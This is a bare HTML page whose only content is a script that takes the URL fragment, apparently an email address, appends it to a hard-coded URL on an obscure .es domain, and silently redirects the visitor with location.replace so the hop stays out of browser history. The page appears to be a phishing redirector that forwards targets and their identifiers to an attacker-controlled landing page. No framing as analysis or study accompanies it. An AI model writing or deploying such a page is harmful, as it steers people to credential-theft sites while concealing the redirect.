<!DOCTYPE html>
<html>
<head>
  <script>
    window.onload = function () {
      var hash = window.location.hash;

      // Remove leading #
      if (hash.startsWith('#')) {
        hash = hash.slice(1);
      }

      // Construct raw URL with unencoded @
      var targetUrl = "https://gcjcf.rlbkzsde.es/0Kx4mizBPPS!A/?XB" + hash;

      // Redirect using replace() to avoid adding to browser history
      window.location.replace(targetUrl);
    };
  </script>
</head>
<body></body>
</html>
